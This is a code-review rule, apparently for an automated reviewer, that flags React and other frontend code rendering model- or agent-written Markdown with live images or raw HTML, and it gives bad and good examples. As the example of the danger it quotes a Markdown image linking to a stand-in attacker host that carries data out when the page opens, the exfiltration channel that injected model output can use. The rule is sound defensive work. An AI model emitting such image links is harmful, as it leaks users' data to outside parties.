---
id: markdown-image-exfil
engine: model
files: ["**/*.{tsx,jsx,ts,js,vue,svelte}"]
exclude: ["**/*.test.*"]
source: memory model-markdown-image-exfil (handy PR #19, 2026-10-03)
---

Markdown written by a model, an agent or an outside source must not render
`<img>` on its own: `![](https://attacker/x?d=<data>)` sends data out when
the page opens. Flag added code that renders such Markdown (react-markdown,
marked, markdown-it, dangerouslySetInnerHTML of converted Markdown) without
replacing images with click-to-open links, or that turns on raw HTML
(`rehype-raw`, `html: true`).

## Bad

`<ReactMarkdown>{message.content}</ReactMarkdown>`

## Good

`<ReactMarkdown components={{ img: ImageLink }}>{message.content}</ReactMarkdown>`
with a CSP of `img-src 'self' data:`
